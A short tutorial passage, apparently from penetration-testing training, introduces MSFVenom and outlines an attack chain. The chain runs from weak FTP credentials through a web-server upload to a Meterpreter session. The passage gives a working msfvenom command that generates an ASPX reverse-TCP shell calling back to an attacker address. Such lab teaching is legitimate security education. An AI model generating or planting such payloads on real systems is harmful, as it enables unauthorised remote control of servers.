## **Introduction to MSFVenom**

`MSFVenom` is the result of the marriage between MSFPayload and MSFEncode.

#### **Creating Our Payloads**

A common payload-delivery scenario:

```
FTP (21)
  ↓
Anonymous / weak credentials
  ↓
Upload payload
  ↓
Web server (80)
  ↓
Trigger payload
  ↓
Reverse TCP connection
  ↓
Meterpreter
```

The example assumes files uploaded through FTP are accessible through the web server's `/uploads` directory and can be executed by the web service.

Because the IIS server can execute `.aspx`, use `msfvenom` to create an **ASPX reverse shell**:

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=10.10.14.5 LPORT=1337 \
-f aspx > reverse_shell.aspx
```
